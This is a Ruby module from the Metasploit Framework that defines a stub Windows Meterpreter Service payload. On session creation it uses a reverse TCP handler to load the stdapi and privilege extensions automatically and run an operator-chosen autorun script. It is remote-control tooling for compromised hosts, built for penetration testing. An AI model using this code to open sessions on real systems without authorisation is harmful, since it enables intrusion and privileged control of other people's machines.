##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter'

module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Meterpreter Service, Reverse TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Stub payload for interacting with a Meterpreter Service',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::Meterpreter,
			'Payload'       =>
				{
					'Offsets' => {},
					'Payload' => ""
				}
			))
		# Set advanced options
		register_advanced_options(
			[
				OptBool.new('AutoLoadStdapi',
					[
						true,
						"Automatically load the Stdapi extension",
						true
					]),
				OptString.new('AutoRunScript', [false, "Script to autorun on meterpreter session creation", ''])
			], self.class)			
	end

	#
	# Once a session is created, automatically load the stdapi extension if the
	# advanced option is set to true.
	#
	def on_session(session)
		super
		if (datastore['AutoLoadStdapi'] == true)
			session.load_stdapi 
			if (framework.exploits.create(session.via_exploit).privileged?)
				session.load_priv 
			end
		end
		if (datastore['AutoRunScript'].empty? == false)
			client = session
			args = datastore['AutoRunScript'].split
			session.execute_script(args.shift, binding)
		end
	end
	
end